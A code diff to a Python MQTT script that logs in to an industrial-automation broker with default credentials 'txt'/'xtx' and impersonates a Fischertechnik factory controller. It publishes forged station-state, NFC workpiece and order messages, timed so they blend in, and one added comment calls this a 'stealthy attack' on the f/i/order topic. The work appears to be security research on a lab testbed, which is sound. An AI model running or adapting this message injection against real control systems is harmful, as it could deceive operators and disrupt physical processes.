@@ -21,12 +21,10 @@ def state(active, code, description="", station="vgr", target=None):
     if target is None:
         data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
                '"station" : "%s",\n\t' % (active, code, description, station)
-        print(data)
         data += new_ts()
     else:
         data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
            '"station" : "%s",\n\t"target" : "%s",\n\t' % (active, code, description, station, target)
-        print(data)
         data += new_ts()
     return data
 
@@ -121,14 +119,16 @@ def on_publish(client, userdata, msgid, *rest):
             data = state(active, code, "", "vgr", "")
             client.publish("f/i/state/vgr", data, qos=1)
 
-        case 19 | 21 | 24 | 29 | 31 | 61 | 66 | 68 | 81:
+        case 19 | 21 | 24 | 29 | 31 | 61 | 66 | 68 | 81 | 89 | 98 | 103 | 108 | 110:
             if msgid == 81:
+                time.sleep(2)
+            if msgid == 98:
                 time.sleep(2)
             data = state(0, 1, "", "dsi")
             client.publish("f/i/state/dsi", data, qos=1)
 
-        case 20 | 22 | 25 | 30 | 32 | 62 | 67 | 69:
-            data = state(0, 1, "", f"dso")
+        case 20 | 22 | 25 | 30 | 32 | 62 | 67 | 69 | 99 | 104 | 109 | 111:
+            data = state(0, 1, "", "dso")
             client.publish("f/i/state/dso", data, qos=1)
 
         case 33:
@@ -208,16 +208,38 @@ def on_publish(client, userdata, msgid, *rest):
             client.publish("fl/vgr/do", data, qos=1)
 
         # case block to handle bulk cases where active, code, target is 0,1,dso respectively
-        case 76 | 78 | 80:
+        case 76 | 78 | 80 | 84 | 86 | 87 | 92 | 94 | 102 | 106 | 107:
             if msgid == 78:
                 time.sleep(3.3)
+            if msgid == 92:
+                time.sleep(0.6)
             data = state(0, 1, "", "vgr", "dso")
             client.publish("f/i/state/vgr", data, qos=1)
 
         # case block to handle bulk cases where active, code, target is 1,2,dso respectively
-        case 77 | 79:
+        case 77 | 79 | 83 | 85 | 91 | 93 | 96 | 105:
+            if msgid == 96:
+                time.sleep(4.5)
             data = state(1, 2, "", "vgr", "dso")
             client.publish("f/i/state/vgr", data, qos=1)
+
+        case 82 | 90:
+            data = state(1, 1, "", f"dso")
+            client.publish("f/i/state/dso", data, qos=1)
+
+        case 88:
+            time.sleep(1)
+            data = '{\n\t"history" : \n\t[\n\t\t{\n\t\t\t"code" : 800,\n\t\t\t' + new_ts()[:-2] + '\n\t\t}\n\t],\n\t' + \
+            new_ts()[-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "048e9b92186581",\n\t\t"state" : "PROCESSED",\n\t\t"type" : "WHITE"\n\t}\n}'
+            client.publish("f/i/nfc/ds", data, qos=1)
+
+        case 97:
+            data = '{\n\t"state" : "SHIPPED",\n\t' + new_ts()[:-2] + ',\n\t"type" : "WHITE"\n}'
+            client.publish("f/i/order", data, qos=1)
+
+        case 100 | 101:
+            data = '{\n\t"state" : "WAITING_FOR_ORDER",\n\t' + new_ts()[:-2] + ',\n\t"type" : "WHITE"\n }'
+            client.publish("f/i/order", data, qos=1)
 
 
 
@@ -230,16 +252,20 @@ def on_publish(client, userdata, msgid, *rest):
 
 
 # What happens if a Publish Message is received? Then we send PubAck
-# **** seems no need for below function. doc says that once on_message returns, a puback is implicity sent out to acknowledge the message
-# def on_message(client, userdata, mqttmsg):
-#     # this automatic behavior can be change by setting manual_ack=True in Client() and then using .ack to manually send puback
-#     # -------------------
-#     print(f"""A publish message was received from broker with the following signature
-#     Client: {client}
-#     Other: {mqttmsg}""")
-#     client.ack(mid=mqttmsg.mid, qos=mqttmsg.qos)  #-- plan here is to take the mid and qos from the received message and place here
+# Update: This function just prints output for now, it may come in useful when I have set my IP to that of the VGR
+def on_message(client, userdata, mqttmsg):
+    # -------------------
+    print(f"""A publish message was received from broker with the following signature
+    Client: {dir(client)}
+    -------------------------
+    Other: {dir(mqttmsg)}""")
 
+    #UPdate: the below client.ack doesn't kick in because I have not set manual_ack=True in client.connect
+    client.ack(mid=mqttmsg.mid, qos=1)  #-- plan here is to take the mid and qos from the received message and place here
 
+    if mqttmsg.mid == 1 or mqttmsg.topic == "f/o/order":
+        print("HAVE A LOOK HERE. You left this open to handle the case of when the broker publishes an order"
+              "to 192.168.0.13 via f/o/order, so you can then begin your stealthy attack with f/i/order at id 34")
 
 
 
@@ -247,10 +273,11 @@ mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFacto
 mqtt_connect.username_pw_set('txt', 'xtx')  # turns out connection happens without txt
 mqtt_connect.connect(host=dst_ip, port=dst_port, keepalive=60)
 
+
 mqtt_connect.on_connect = on_connect
 mqtt_connect.on_subscribe = on_subscribe
 mqtt_connect.on_publish = on_publish
-# mqtt_connect.on_message = on_message  -- use this if manual_ack==True is ever set in mqtt.Client
+mqtt_connect.on_message = on_message  #-- use this if manual_ack==True is ever set in mqtt.Client
 
 
 
